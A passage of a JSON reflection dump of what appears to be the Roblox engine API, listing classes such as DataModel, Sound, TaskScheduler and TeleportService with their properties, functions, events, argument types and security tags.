Selection","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"selection","Default":null}],"Name":"Set","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"Arguments":[],"Name":"SelectionChanged","tags":[],"Class":"Selection","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ServerScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServerStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServiceProvider","tags":["notbrowsable"]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"GetService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"getService","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"service","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"Arguments":[],"Name":"Close","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[],"Name":"CloseLate","tags":["LocalUserSecurity"],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceAdded","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceRemoving","tags":[],"Class":"ServiceProvider","type":"Event"},{"Superclass":"ServiceProvider","type":"Class","Name":"DataModel","tags":[]},{"ValueType":"int","type":"Property","Name":"CreatorId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"CreatorType","type":"Property","Name":"CreatorType","tags":["readonly"],"Class":"DataModel"},{"ValueType":"GearGenreSetting","type":"Property","Name":"GearGenreSetting","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Genre","type":"Property","Name":"Genre","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"IsPersonalServer","tags":["RobloxScriptSecurity"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"JobId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"LocalSaveEnabled","tags":["RobloxScriptSecurity","readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceVersion","tags":["readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"VIPServerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"VIPServerOwnerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"Workspace","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"lighting","tags":["deprecated","readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"workspace","tags":["deprecated","readonly"],"Class":"DataModel"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"displayName","Default":null},{"Type":"string","Name":"stat","Default":null}],"Name":"AddStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"localSave","Default":null}],"Name":"FinishShutdown","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobIntervalPeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobTimePeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsExtendedStats","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsInfo","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetMessage","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetRemoteBuildMode","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"}],"Name":"HttpGet","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPost","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"GearType","Name":"gearType","Default":null}],"Name":"IsGearTypeAllowed","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsLoaded","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Load","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadGame","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadPlugins","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadWorld","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stat","Default":null}],"Name":"RemoveStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":"custom"},{"Type":"string","Name":"label","Default":"none"},{"Type":"int","Name":"value","Default":"0"}],"Name":"ReportInGoogleAnalytics","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"id","Default":null},{"Type":"string","Name":"key1","Default":null},{"Type":"string","Name":"value1","Default":null},{"Type":"string","Name":"key2","Default":null},{"Type":"string","Name":"value2","Default":null}],"Name":"ReportMeasurement","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Save","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveStats","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ServerSave","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorID","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorId","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"GearGenreSetting","Name":"genreRestriction","Default":null},{"Type":"int","Name":"allowedGenres","Default":null}],"Name":"SetGearSettings","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Genre","Name":"genre","Default":null}],"Name":"SetGenre","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetJobsExtendedStatsWindow","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"SetMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetMessageBrickCount","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeID","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceVersion","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"buildModeEnabled","Default":null}],"Name":"SetRemoteBuildMode","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetScreenshotInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetServerSaveUrl","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"universeId","Default":null}],"Name":"SetUniverseId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"newId","Default":null}],"Name":"SetVIPServerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"newId","Default":null}],"Name":"SetVIPServerOwnerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetVideoInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Shutdown","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleTools","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"HttpGetAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPostAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"SaveFilter","Name":"saveFilter","Default":"SaveAll"}],"Name":"SavePlace","tags":[],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"SaveToRoblox","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"Arguments":[],"Name":"AllowedGearTypeChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"betterQuality","Type":"bool"}],"Name":"GraphicsQualityChangeRequest","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"descriptor","Type":"Property"}],"Name":"ItemChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[],"Name":"Loaded","tags":[],"Class":"DataModel","type":"Event"},{"ReturnType":"Tuple","Arguments":[],"Name":"OnClose","tags":[],"Class":"DataModel","type":"Callback"},{"ReturnType":"bool","Arguments":[],"Name":"RequestShutdown","tags":["RobloxScriptSecurity","noyield"],"Class":"DataModel","type":"Callback"},{"Superclass":"ServiceProvider","type":"Class","Name":"GenericSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"GlobalSettings","tags":["notbrowsable"]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFFlag","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFVariable","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetFVariables","tags":["RobloxScriptSecurity"],"Class":"GlobalSettings","type":"Function"},{"Superclass":"GenericSettings","type":"Class","Name":"UserSettings","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"IsUserFeatureEnabled","tags":[],"Class":"UserSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":[],"Class":"UserSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sky","tags":[]},{"ValueType":"bool","type":"Property","Name":"CelestialBodiesShown","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxBk","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxDn","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxFt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxLf","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxRt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxUp","tags":[],"Class":"Sky"},{"ValueType":"int","type":"Property","Name":"StarCount","tags":[],"Class":"Sky"},{"Superclass":"Instance","type":"Class","Name":"Smoke","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Smoke"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Opacity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"RiseVelocity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Smoke"},{"Superclass":"Instance","type":"Class","Name":"SocialService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"bestFriendUrl","Default":null}],"Name":"SetBestFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"friendUrl","Default":null}],"Name":"SetFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRankUrl","Default":null}],"Name":"SetGroupRankUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRoleUrl","Default":null}],"Name":"SetGroupRoleUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupUrl","Default":null}],"Name":"SetGroupUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetPackageContentsUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetStuffUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sound","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MinDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Pitch","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"PlayOnRemove","tags":[],"Class":"Sound"},{"ValueType":"Content","type":"Property","Name":"SoundId","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimeLength","tags":["readonly"],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimePosition","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"isPlaying","tags":["deprecated","readonly"],"Class":"Sound"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"pause","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"play","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"stop","tags":["deprecated"],"Class":"Sound","type":"Function"},{"Arguments":[{"Name":"soundId","Type":"string"},{"Name":"numOfTimesLooped","Type":"int"}],"Name":"DidLoop","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Ended","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Paused","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Played","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Stopped","tags":[],"Class":"Sound","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"SoundService","tags":["notCreatable"]},{"ValueType":"ReverbType","type":"Property","Name":"AmbientReverb","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DistanceFactor","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DopplerScale","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"RolloffScale","tags":[],"Class":"SoundService"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetListener","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SoundType","Name":"sound","Default":null}],"Name":"PlayStockSound","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ListenerType","Name":"listenerType","Default":null},{"Type":"Tuple","Name":"listener","Default":null}],"Name":"SetListener","tags":[],"Class":"SoundService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sparkles","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["hidden"],"Class":"Sparkles"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Sparkles"},{"ValueType":"Color3","type":"Property","Name":"SparkleColor","tags":[],"Class":"Sparkles"},{"Superclass":"Instance","type":"Class","Name":"SpawnerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterGear","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterPlayer","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"EnableMouseLockOption","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"LoadCharacterAppearance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"StarterPlayer"},{"Superclass":"Instance","type":"Class","Name":"StarterPlayerScripts","tags":[]},{"Superclass":"StarterPlayerScripts","type":"Class","Name":"StarterCharacterScripts","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Stats","tags":["notCreatable"]},{"ValueType":"double","type":"Property","Name":"MinReportInterval","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ValueType":"string","type":"Property","Name":"ReporterType","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"Dictionary","Name":"data","Default":null}],"Name":"Report","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportJobsStepWindow","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"includeJobs","Default":"false"}],"Name":"ReportTaskScheduler","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetReportUrl","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"StatsItem","tags":[]},{"ReturnType":"double","Arguments":[],"Name":"GetValue","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetValueString","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"ProfilingItem","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"double","Name":"window","Default":"0"}],"Name":"GetTimes","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"frames","Default":"1"}],"Name":"GetTimesForFrames","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemDouble","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemInt","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageTimeIntervalItem","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"TotalCountTimeIntervalItem","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StringValue","tags":[]},{"ValueType":"string","type":"Property","Name":"Value","tags":[],"Class":"StringValue"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"Changed","tags":[],"Class":"StringValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"changed","tags":["deprecated"],"Class":"StringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"StudioTool","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"StudioTool"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"StudioTool","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TaskScheduler","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreArbitersThrottled","tags":[],"Class":"TaskScheduler"},{"ValueType":"ConcurrencyModel","type":"Property","Name":"Concurrency","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumRunningJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumSleepingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumWaitingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"PriorityMethod","type":"Property","Name":"PriorityMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerDutyCycle","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerRate","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"SleepAdjustMethod","type":"Property","Name":"SleepAdjustMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThreadAffinity","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"ThreadPoolConfig","type":"Property","Name":"ThreadPoolConfig","tags":[],"Class":"TaskScheduler"},{"ValueType":"int","type":"Property","Name":"ThreadPoolSize","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThrottledJobSleepTime","tags":[],"Class":"TaskScheduler"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusive","Default":"true"},{"Type":"double","Name":"fps","Default":"30"}],"Name":"AddDummyJob","tags":["LocalUserSecurity"],"Class":"TaskScheduler","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"timeSlice","Default":null},{"Type":"int","Name":"numShare","Default":null}],"Name":"SetThreadShare","tags":["LocalUserSecurity","deprecated"],"Class":"TaskScheduler","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Team","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoAssignable","tags":[],"Class":"Team"},{"ValueType":"bool","type":"Property","Name":"AutoColorCharacters","tags":["deprecated"],"Class":"Team"},{"ValueType":"int","type":"Property","Name":"Score","tags":["deprecated"],"Class":"Team"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Team"},{"Superclass":"Instance","type":"Class","Name":"Teams","tags":["notCreatable"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetTeams","tags":[],"Class":"Teams","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RebalanceTeams","tags":["deprecated"],"Class":"Teams","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TeleportService","tags":[]},{"ValueType":"bool","type":"Property","Name":"CustomizedTeleportUI","tags":["deprecated"],"Class":"TeleportService"},{"ReturnType":"Variant","Arguments":[],"Name":"GetLocalPlayerTeleportData","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"setting","Default":null}],"Name":"GetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"setting","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"Teleport","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"TeleportCancel","tags":["RobloxScriptSecurity"],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"instanceId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPlaceInstance","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"reservedServerAccessCode","Default":null},{"Type":"Objects","Name":"players","Default":null},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPrivateServer","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"spawnName","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToSpawnByName","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerPlaceInstanceAsync","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"ReserveServer","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"Arguments":[{"Name":"loadingGui","Type":"Instance"},{"Name":"dataTable","Type":"Variant"}],"Name":"LocalPlayerArrivedFromTeleport","tags":[],"Class":"TeleportService","type":"Event"},{"ReturnType":"bool","Arguments":[{"Name":"message","Type":"string"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"ConfirmationCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"ReturnType":"void","Arguments":[{"Name":"message","Type":"string"}],"Name":"ErrorCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"TerrainRegion","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"TerrainRegion"},{"ValueType":"Vector3","type":"Property","Name":"SizeInCells","tags":["readonly"],"Class":"TerrainRe